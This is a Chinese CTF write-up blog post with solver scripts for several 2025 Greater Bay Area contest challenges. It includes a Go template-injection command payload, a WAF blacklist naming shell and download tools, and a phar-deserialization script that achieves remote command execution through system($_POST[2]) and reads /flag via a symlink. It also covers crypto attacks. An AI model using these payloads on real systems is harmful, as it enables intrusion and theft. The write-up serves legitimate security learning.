---
title: 2025湾区杯部分题解和复现
published: 2025-09-10
pinned: false
description: 2025大湾区网络安全大赛，crypto，wp
tags: ['crypto']
category: CTF-crypto
licenseName: "MIT"
author: zsm
draft: false
date: 2025-09-10
pubDate: 2025-09-10
---


## 前言

差不多solo打了一天，上午上不去平台，下午刚刚好没课

## hardtest

ida启动，算法流程是：输入字符 -> 异或0x5A -> 循环左移3位 -> 特殊变换 -> 模幂运算 -> 循环右移2位 -> S-box查表。

exp.py

```python
sbox = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
]

target = [
    0x97, 0xd5, 0x60, 0x43, 0xb4, 0x10, 0x43, 0x73, 0x0f, 0xda, 0x43, 0xcd, 
    0xd3, 0xe8, 0x73, 0x4a, 0x94, 0xc3, 0xcd, 0x71, 0xbd, 0xdc, 0x97, 0x1a
]

def rol(val, shift):
    val &= 0xFF
    return ((val << shift) | (val >> (8 - shift))) & 0xFF

def ror(val, shift):
    val &= 0xFF
    return ((val >> shift) | (val << (8 - shift))) & 0xFF

def mod_pow(base, exp, mod):
    if base == 0:
        return 0
    result = 1
    base = base % mod
    while exp > 0:
        if exp & 1:
            result = (result * base) % mod
        exp >>= 1
        base = (base * base) % mod
    return result

def extended_gcd(a, b):
    if a == 0:
        return b, 0, 1
    gcd, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return gcd, x, y

def mod_inverse(a, m):
    if a == 0:
        return 0
    gcd, x, y = extended_gcd(a, m)
    if gcd != 1:
        return None
    return (x % m + m) % m

def encrypt_char(c, pos):
    val = rol(ord(c), (pos % 7) + 1)
    val = val ^ 0x5A
    val = rol(val, 3)
    high_nibble = (val >> 4) & 0xF
    low_nibble = val & 0xF
    transformed = ((16 * ((3 * high_nibble) & 0xF)) | ((5 * low_nibble) & 0xF)) & 0xFF
    mod_result = mod_pow(transformed, 255, 257)
    shifted = ror(mod_result, 2)
    return sbox[shifted]

def decrypt_char(encrypted_val, pos):
    try:
        shifted = sbox.index(encrypted_val)
    except ValueError:
        return None
    mod_result = rol(shifted, 2)
    transformed = mod_inverse(mod_result, 257)
    if transformed is None:
        return None
    for high in range(16):
        for low in range(16):
            test_val = ((16 * ((3 * high) & 0xF)) | ((5 * low) & 0xF)) & 0xFF
            if test_val == transformed:
                original_val = (high << 4) | low
                val = ror(original_val, 3)
                char_val = val ^ 0x5A
                char_val = ror(char_val, (pos % 7) + 1)
                if 32 <= char_val <= 126:
                    return chr(char_val)
    
    return None

def brute_force_char(target_val, pos):
    for c in range(32, 127):  # 可打印ASCII字符
        char = chr(c)
        if encrypt_char(char, pos) == target_val:
            return char
    return None

def solve_flag():
    flag = ""
    
    for i, encrypted_byte in enumerate(target):
        decrypted_char = decrypt_char(encrypted_byte, i)

        if not decrypted_char:
            decrypted_char = brute_force_char(encrypted_byte, i)
        
        if decrypted_char:
            flag += decrypted_char
            print(f"位置 {i}: 0x{encrypted_byte:02x} -> '{decrypted_char}'")
        else:
            print(f"位置 {i}: 0x{encrypted_byte:02x} -> 解密失败")
            flag += "?"

    for i, c in enumerate(flag):
        if c != "?":
            encrypted = encrypt_char(c, i)
            expected = target[i]
            status = "✓" if encrypted == expected else "✗"
            print(f"'{c}' -> 0x{encrypted:02x} (期望: 0x{expected:02x}) {status}")
    
    return flag

if __name__ == "__main__":
    flag = solve_flag()
    print(f"\nFinal Flag: {flag}")
```

## ssti

go的ssti.  

`{{.}}`回显`map[B64Decode:0x6ee380 exec:0x6ee120]`，前面没学过这玩意，现学一下，有黑名单，可以base绕过，也可以更加直接一点`{{exec "tac /??a?"}}`.

题目源码

```go
package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"text/template"
)

func execCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}

	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	err := cmd.Run()
	if err != nil {
		if stderr.Len() > 0 {
			return fmt.Sprintf("命令执行错误: %s", stderr.String())
		}
		return fmt.Sprintf("执行失败: %v", err)
	}
	return out.String()
}

func b64Decode(encoded string) string {
	decodedBytes, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "error"
	}
	return string(decodedBytes)
}

func aWAF(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api" {
			next.ServeHTTP(w, r)
			return
		}

		query := r.URL.Query().Get("template")
		if query == "" {
			next.ServeHTTP(w, r)
			return
		}

		blacklist := []string{"ls", "whoami", "cat", "uname", "nc", "flag", "etc", "passwd", "\\*", "pwd", "rm", "cp", "mv", "chmod", "chown", "wget", "curl", "bash", "sh", "python", "perl", "ruby", "system", "eval", "less", "more", "find", "grep", "awk", "sed", "tar", "zip", "unzip", "gzip", "gunzip", "bzip2", "bunzip2", "xz", "unxz", "docker", "kubectl", "git", "svn", "f", "l", "g", ",", "\\?", "&&", "\\|", ";", "`", "\"", ">", "<", ":", "=", "\\(", "\\)", "%", "\\\\", "\\^", "\\$", "!", "@", "#", "&"}
		escaped := make([]string, len(blacklist))
		for i, item := range blacklist {
			escaped[i] = "\\b" + item + "\\b"
		}
		wafRegex := regexp.MustCompile(fmt.Sprintf("(?i)%s", strings.Join(escaped, "|")))

		if wafRegex.MatchString(query) {
			// log.Printf("拦截请求: %s", wafRegex.FindAllString(query, -1))
			http.Error(w, query, 200)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func apiHandler(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query().Get("template")
	if query == "" {
		http.Error(w, "需要template参数", http.StatusBadRequest)
		return
	}

	funcMap := template.FuncMap{
		"exec":      execCommand,
		"B64Decode": b64Decode,
	}

	tmpl, err := template.New("api").Funcs(funcMap).Parse(query)
	if err != nil {
		http.Error(w, query, http.StatusAccepted)
		return
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, funcMap); err != nil {
		http.Error(w, query, http.StatusAccepted)
		return
	}

	w.Write(buf.Bytes())
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}

	http.ServeFile(w, r, "index.html")
}

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", rootHandler)
	mux.HandleFunc("/api", apiHandler)

	log.Println("服务器启动在 :80")
	log.Fatal(http.ListenAndServe(":80", aWAF(mux)))
}
```

## checkwebshell

去追踪流量可以看见一个sm4

```php
<?php
class SM4 {
    const ENCRYPT = 1;
    private $sk; 
    private static $FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC];
    private static $CK = [
        0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,
        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,
        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,
        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,
        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,
        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,
        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,
        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279
    ];
    private static $SboxTable = [
        0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,
        0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
        0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,
        0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,
        0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,
        0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,
        0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x0D, 0x2D, 0xEC,
        0x84, 0x9B, 0x1E, 0x87, 0xE0, 0x3E, 0xB5, 0x66, 0x48, 0x02, 0x6C, 0xBB, 0xBB, 0x32, 0x83, 0x27,
        0x9E, 0x01, 0x8D, 0x53, 0x9B, 0x64, 0x7B, 0x6B, 0x6A, 0x6C, 0xEC, 0xBB, 0xC4, 0x94, 0x3B, 0x0C,
        0x76, 0xD2, 0x09, 0xAA, 0x16, 0x15, 0x3D, 0x2D, 0x0A, 0xFD, 0xE4, 0xB7, 0x37, 0x63, 0x28, 0xDD,
        0x7C, 0xEA, 0x97, 0x8C, 0x6D, 0xC7, 0xF2, 0x3E, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7,
        0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x36, 0x24, 0x07, 0x82, 0xFA, 0x54, 0x5B, 0x40,
        0x8F, 0xED, 0x1F, 0xDA, 0x93, 0x80, 0xF9, 0x61, 0x1C, 0x70, 0xC3, 0x85, 0x95, 0xA9, 0x79, 0x08,
        0x46, 0x29, 0x02, 0x3B, 0x4D, 0x83, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x1A, 0x47, 0x5C, 0x0D, 0xEA,
        0x9E, 0xCB, 0x55, 0x20, 0x15, 0x8A, 0x9A, 0xCB, 0x43, 0x0C, 0xF0, 0x0B, 0x40, 0x58, 0x00, 0x8F,
        0xEB, 0xBE, 0x3D, 0xC2, 0x9F, 0x51, 0xFA, 0x13, 0x3B, 0x0D, 0x90, 0x5B, 0x6E, 0x45, 0x59, 0x33
    ];

    public function __construct($key) {
        $this->setKey($key);
    }
    public function setKey($key) {
        if (strlen($key) != 16) {
            throw new Exception("SM4");
        }
        $key = $this->strToIntArray($key);
        $k = array_merge($key, [0, 0, 0, 0]);
        for ($i = 0; $i < 4; $i++) {
            $k[$i] ^= self::$FK[$i];
        }
        for ($i = 0; $i < 32; $i++) {
            $k[$i + 4] = $k[$i] ^ $this->CKF($k[$i + 1], $k[$i + 2], $k[$i + 3], self::$CK[$i]);
            $this->sk[$i] = $k[$i + 4];
        }
    }
    public function encrypt($plaintext) {
        $len = strlen($plaintext);
        $padding = 16 - ($len % 16);
        $plaintext .= str_repeat(chr($padding), $padding); 
        $ciphertext = '';
        for ($i = 0; $i < strlen($plaintext); $i += 16) {
            $block = substr($plaintext, $i, 16);
            $ciphertext .= $this->cryptBlock($block, self::ENCRYPT);
        }
        return $ciphertext;
    }
    private function cryptBlock($block, $mode) {
        $x = $this->strToIntArray($block);

        for ($i = 0; $i < 32; $i++) {
            $roundKey = $this->sk[$i];
            $x[4] = $x[0] ^ $this->F($x[1], $x[2], $x[3], $roundKey);
            array_shift($x);
        }
        $x = array_reverse($x);
        return $this->intArrayToStr($x);
    }
    private function F($x1, $x2, $x3, $rk) {
        return $this->T($x1 ^ $x2 ^ $x3 ^ $rk);
    }
    private function CKF($a, $b, $c, $ck) {
        return $a ^ $this->T($b ^ $c ^ $ck);
    }
    private function T($x) {
        return $this->L($this->S($x));
    }
    private function S($x) {
        $result = 0;
        for ($i = 0; $i < 4; $i++) {
            $byte = ($x >> (24 - $i * 8)) & 0xFF;
            $result |= self::$SboxTable[$byte] << (24 - $i * 8);
        }
        return $result;
    }
    private function L($x) {
        return $x ^ $this->rotl($x, 2) ^ $this->rotl($x, 10) ^ $this->rotl($x, 18) ^ $this->rotl($x, 24);
    }
    private function rotl($x, $n) {
        return (($x << $n) & 0xFFFFFFFF) | (($x >> (32 - $n)) & 0xFFFFFFFF);
    }
    private function strToIntArray($str) {
        $result = [];
        for ($i = 0; $i < 4; $i++) {
            $offset = $i * 4;
            $result[$i] =
                (ord($str[$offset]) << 24) |
                (ord($str[$offset + 1]) << 16) |
                (ord($str[$offset + 2]) << 8) |
                ord($str[$offset + 3]);
        }
        return $result;
    }
    private function intArrayToStr($array) {
        $str = '';
        foreach ($array as $int) {
            $str .= chr(($int >> 24) & 0xFF);
            $str .= chr(($int >> 16) & 0xFF);
            $str .= chr(($int >> 8) & 0xFF);
            $str .= chr($int & 0xFF);
        }
        return $str;
    }
}
try {
    $key = "a8a58b78f41eeb6a";
    $sm4 = new SM4($key);
    $plaintext = "flag";
    $ciphertext = $sm4->encrypt($plaintext);
    echo  base64_encode($ciphertext) ; //VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu
} catch (Exception $e) {
    echo $e->getMessage() ;
}
?>
```

直接解密就行了，exp就不放了

## ez_python

先文件传一个呗，发现无权限，f12发现是jwt，爆破两位伪造成功，然后传py，发现是沙箱逃逸，这里直接斜体绕过，拿到flag。

题目源码

```
from flask import Flask, request, jsonify, render_template_string
import jwt
import asyncio
import yaml
import os

app = Flask(__name__)

JWT_SECRET = "@o70xO$0%#qR9#m0"
JWT_ALGO = "HS256"

FORBIDDEN = ['__', 'import', 'os', 'eval', 'exec', 'open', 'read', 'write', 'system', 'subprocess', 'communicate', 'Popen', 'decode', "\\"]

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Vault</title>
    <style>
        body { font-family: "Segoe UI", sans-serif; background-color: #f4f4f4; padding: 40px; text-align: center; }
        #user-info { margin-bottom: 40px; font-weight: bold; font-size: 18px; color: #333; }
        #sandbox-container { margin-top: 30px; }
        select, input, button { font-size: 16px; margin: 10px; padding: 8px; border-radius: 6px; border: 1px solid #ccc; }
        #result { background: #222; color: #0f0; padding: 15px; width: 80%; margin: 20px auto; white-space: pre-wrap; border-radius: 8px; text-align: left; }
        button { background-color: #4CAF50; color: white; border: none; cursor: pointer; }
        button:hover { background-color: #45a049; }
        input[type="file"] { display: block; margin: 10px auto; }
    </style>
</head>
<body>
    <div id="user-info">Loading user info...</div>
    <div id="sandbox-container">
        <select id="mode">
            <option value="yaml" selected>YAML</option>
            <option value="python">Python</option>
        </select>
        <br>
        <input type="file" id="codefile">
        <br>
        <button onclick="runCode()">▶ Execute from File</button>
        <pre id="result">Waiting for output...</pre>
    </div>
    <script>
        let token = "";
        fetch("/auth")
            .then(res => res.json())
            .then(data => {
                token = data.token;
                const payload = JSON.parse(atob(token.split('.')[1]));
                document.getElementById("user-info").innerHTML =
                    "<span style='color:#444'>👤 " + payload.username + "</span> | " +
                    "<span style='color:#4CAF50'>Role: " + payload.role + "</span>";
            });

        function runCode() {
            const fileInput = document.getElementById('codefile');
            const mode = document.getElementById("mode").value;

            if (fileInput.files.length === 0) {
                document.getElementById("result").textContent = '{"error": "Please select a file to upload."}';
                return;
            }
            const file = fileInput.files[0];

            const formData = new FormData();
            formData.append('codefile', file);
            formData.append('mode', mode);

            fetch("/sandbox", {
                method: "POST",
                headers: {
                    "Authorization": "Bearer " + token
                },
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                document.getElementById("result").textContent = JSON.stringify(data, null, 2);
            });
        }
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/auth')
def auth():
    token = jwt.encode({'username': 'guest', 'role': 'user'}, JWT_SECRET, algorithm=JWT_ALGO)
    if isinstance(token, bytes):
        token = token.decode()

    return jsonify({'token': token})

def is_code_safe(code: str) -> bool:
    return not any(word in code for word in FORBIDDEN)

@app.route('/sandbox', methods=['POST'])
def sandbox():
    auth_header = request.headers.get('Authorization', '')
    if not auth_header.startswith('Bearer '):
        return jsonify({'error': 'Invalid token format'}), 401
    token = auth_header.replace('Bearer ', '')
    if 'codefile' not in request.files:
        return jsonify({'error': 'No file part in the request'}), 400

    file = request.files['codefile']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    mode = request.form.get('mode', 'python')
    try:
        code = file.read().decode('utf-8')
    except Exception as e:
        return jsonify({'error': f'Could not read or decode file: {e}'}), 400

    if not all([token, code, mode]):
        return jsonify({'error': 'Token, code, or mode is empty'}), 400

    try:
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGO])
    except Exception as e:
        partial_key = JWT_SECRET[:-2]
        return {
            'error': 'JWT Decode Failed. Key Hint',
            'hint': f'Key starts with "{partial_key}**". The 2 missing chars are alphanumeric (letters and numbers).'
        }, 500

    if payload.get('role') != 'admin':
        return {'error': 'Permission Denied: admin only'}, 403

    if mode == 'python':
        if not is_code_safe(code):
            return {'error': 'forbidden keyword detected'}, 400
        try:
            scope = {}
            exec(code, scope)
            result = scope['run']()
            return {'result': result}
        except Exception as e:
            return {'error': str(e)}, 500

    elif mode == 'yaml':
        try:
            obj = yaml.load(code, Loader=yaml.UnsafeLoader)
            return {'result': str(obj)}
        except Exception as e:
            return {'error': str(e)}, 500

    return {'error': 'invalid mode'}, 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

## easy_readfile(赛后)
看包神博客说DeadsecCTF2025类似，后面看看，先存个脚本（）

```python
import http.client
import urllib.parse
import gzip
import re
import time
import socket

def _post(url, body, headers=None, timeout=None):
    u = urllib.parse.urlsplit(url)
    host = u.hostname
    port = u.port or (80 if u.scheme == 'http' else 443)
    path = u.path or '/'
    if u.query:
        path += '?' + u.query
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("POST", path, body=body, headers=headers or {'Content-Type':'application/x-www-form-urlencoded'})
        resp = conn.getresponse()
        data = resp.read().decode('utf-8', 'ignore')
        return data
    finally:
        conn.close()

def write(url):
    with open('phar.phar', 'rb') as f:
        raw = f.read()
    gz = gzip.compress(raw)
    v0 = urllib.parse.quote_from_bytes(gz)
    body = '1=' + 'O:7:"Acheron":1:{s:4:"mode";s:1:"w";}' + '&0=' + v0
    r = _post(url, body, {'Content-Type':'application/x-www-form-urlencoded'})
    m = re.search(r'/tmp/[0-9a-f]{32}\.phar', r)
    if not m:
        return None
    return m.group(0)

def read(url, phar_path):
    v0 = urllib.parse.quote(phar_path, safe='')
    body = '1=' + 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}' + '&0=' + v0
    r = _post(url, body, {'Content-Type':'application/x-www-form-urlencoded'})
    m = re.search(r'flag', r)
    return m.group(0) if m else None

def runtime_exec(url, phar_path, cmd):
    v0 = urllib.parse.quote(phar_path, safe='')
    v2 = urllib.parse.quote(cmd, safe='')
    body = '1=' + 'O:7:"Acheron":1:{s:4:"mode";s:1:"r";}' + '&0=' + v0 + '&2=' + v2
    r = _post(url + "?1=system($_POST[2]);", body, {'Content-Type':'application/x-www-form-urlencoded'})
    return r


def getflag(url, phar_path):
    r1 = runtime_exec(url, phar_path,"pwd")
    m1 = re.search(r'/var/www/html', r1)
    if m1 :
        print("[+] 命中标记，可以进行下一步")
        runtime_exec(url, phar_path, "touch -- -H")
        print("成功创建覆盖项")
        time.sleep(1)
        runtime_exec(url, phar_path, "ln -s /flag flag")
        print("成功创建软连接")
        time.sleep(15)
        r2 = runtime_exec(url, phar_path, "cat backup/flag")
        m2 = re.search(r'flag\{[^}\r\n]+\}', r2, re.I)
        if m2:
            return m2.group(0)
    else :
        print("[-] 未命中标记，退出或重试")

if __name__ == '__main__':
    url = ""
    phar_path = write(url)
    if phar_path:
        time.sleep(1)
        print(read(url, phar_path))
        time.sleep(1)
        flag=getflag(url, phar_path)
        print(flag)
```

## new_trick

task.py 

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from secrets import flag, secret

assert secret < 2 ** 50
p = 115792089237316195423570985008687907853269984665640564039457584007913129639747
Q_components = (123456789, 987654321, 135792468, 864297531)

class Quaternion:
    def __init__(self, a, b, c, d):
        self.p = p
        self.a = a % self.p
        self.b = b % self.p
        self.c = c % self.p
        self.d = d % self.p

    def __repr__(self):
        return f"Q({self.a}, {self.b}, {self.c}, {self.d})"

    def __mul__(self, other):
        a1, b1, c1, d1 = self.a, self.b, self.c, self.d
        a2, b2, c2, d2 = other.a, other.b, other.c, other.d
        a_new = a1 * a2 - b1 * b2 - c1 * c2 - d1 * d2
        b_new = a1 * b2 + b1 * a2 + c1 * d2 - d1 * c2
        c_new = a1 * c2 - b1 * d2 + c1 * a2 + d1 * b2
        d_new = a1 * d2 + b1 * c2 - c1 * b2 + d1 * a2
        return Quaternion(a_new, b_new, c_new, d_new)

def power(base_quat, exp):
    res = Quaternion(1, 0, 0, 0)
    base = base_quat
    while exp > 0:
        if exp % 2 == 1:
            res = res * base
        base = base * base
        exp //= 2
    return res

Q = Quaternion(*Q_components)
R = power(Q,secret)

print("--- Public Parameters ---")
print(f"p = {p}")
print(f"Q = {Q}")
print(f"R = {R}")

'''
--- Public Parameters ---
p = 
Q = Q()
R = Q()
'''

key = md5(str(secret).encode()).hexdigest().encode()
cipher = AES.new(key=key,mode=AES.MODE_ECB)
print(cipher.encrypt(pad(flag,16)))

```

本来以为要有什么四元数的技巧去求dlp，后面看他们出的那么快我也绷不住了，好像就2**50的范围左右，bsgs就可以打

```python
from hashlib import md5

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


def solve():

    p = 
    Q_components = ()
    R_components = ()
    ciphertext = b''
    a, b, c, d = Q_components
    norm_Q = (a*a + b*b + c*c + d*d) % p
    a, b, c, d = R_components
    norm_R = (a*a + b*b + c*c + d*d) % p
 
    bound = 2**50

    def bsgs(base, result, modulus, bound):

        if not bound:
            bound = modulus
        m = int(bound**0.5) + 1
 
        baby_steps = {}
        val = 1
        for j in range(m):
            if j % 1000000 == 0:
                print(f"  ... baby step {j}/{m}")
            baby_steps[val] = j
            val = (val * base) % modulus
        try:
            giant_step_factor = pow(base, -m, modulus)
        except ValueError:
            return None

        val = result
        for i in range(m):
            if i % 1000000 == 0:
                print(f"  ... giant step {i}/{m}")
            if val in baby_steps:
                j = baby_steps[val]
                x = i * m + j
                if pow(base, x, modulus) == result:
                    return x
            val = (val * giant_step_factor) % modulus
        return None

    secret = bsgs(norm_Q, norm_R, p, bound)

    if secret is None:
        print("未能找到 secret。BSGS 算法失败。")
        return

    print(f"成功找到 secret: {secret}")

    # 3. 使用 secret 解密 flag
    # key 是 secret 的 md5 哈希
    key = md5(str(secret).encode()).hexdigest().encode()
    cipher = AES.new(key=key, mode=AES.MODE_ECB)
    
    try:
        # 解密并去除 padding
        decrypted_data = cipher.decrypt(ciphertext)
        flag = unpad(decrypted_data, 16)
        print(f"🎉 成功解密！Flag: {flag.decode()}")
    except (ValueError, KeyError) as e:
        print(f"解密失败。secret 可能不正确。错误: {e}")
        print(f"解密后的数据 (raw): {decrypted_data}")

if __name__ == '__main__':
    solve()

```

## someinterersa(赛后非预期)

nssctf4th的iqqt与之一样，这下知道为什么不放wp了。  

与之不同的是nss那个只有一组数据，这玩意的理论上无上限，且加密方式很普通，那我收集到足够多的nc对是可以打crt的。  

理论存在，实践开始。

先存个几万对

```python
from sage.all import *

from pwn import *


def work(b):
    ls = b.decode().strip().split('\n')
    N = Integer(int(ls[0].split(' ')[-1]))
    c = Integer(int(ls[3].split(' ')[-1]))
    return N, c
file = open("temp.txt", "a")
while True:
    cs = [remote('pwn-ed184decc2.challenge.xctf.org.cn', 9999, ssl=True) for _ in range(128)]
    r = [work(conn.recvall()) for conn in cs]
    for conn in cs:
        conn.close()
    print(str(r), file=file)
    file.flush()
```

赛时存了几千对没有效果，估计是太少了，要继续扩大范围，这里上课的时候跑了1h50min，应该是够用了。  

这里调了几次，差不多1w2左右的数据就够了，优化了一下代码，35s可以出来

```python
import ast
import time
from functools import reduce
from multiprocessing import Pool, cpu_count
from operator import mul

import gmpy2
from sage.all import CRT, Integer

from Crypto.Util.number import long_to_bytes


def worker_crt(nums_chunk):
    """每个进程计算部分 CRT 和对应模数乘积"""
    moduli = [x[0] for x in nums_chunk]
    residues = [x[1] for x in nums_chunk]
    c = CRT(residues, moduli)
    n_prod = reduce(mul, moduli)
    return n_prod, c


def recursive_crt(results):
    """递归分治合并多进程 CRT 结果"""
    while len(results) > 1:
        temp = []
        for i in range(0, len(results), 2):
            if i + 1 < len(results):
                n1, r1 = results[i]
                n2, r2 = results[i + 1]
                combined = CRT([r1, r2], [n1, n2])
                temp.append((n1 * n2, combined))
            else:
                temp.append(results[i])
        results = temp
    return results[0]


if __name__ == "__main__":
    parallel = min(16, cpu_count())

    # 只读一次文件
    with open("temp.txt", "r") as f:
        n = []
        for line in f:
            n += ast.literal_eval(line.strip())

    n = n[:20000]
    print(f"总数据长度: {len(n)}")

    # 主进程提前转换成 Integer 对象
    n = [(Integer(x[0]), Integer(x[1])) for x in n]

    t0 = time.time()
    # 切分数据块
    share = len(n) // parallel
    chunks = [n[i * share:(i + 1) * share] for i in range(parallel)]

    with Pool(parallel) as pool:
        results = pool.map(worker_crt, chunks)

    # 分治合并 CRT
    total_modulus, total_residue = recursive_crt(results)

    # 计算 65537 次方根
    m, exact = gmpy2.iroot(int(total_residue), 65537)
    if exact:
        print("整数根计算成功！")
        print(m)
        print(long_to_bytes(m))
    else:
        print("没有精确整数根！")

    print(f"耗时: {time.time() - t0:.2f} 秒")
```


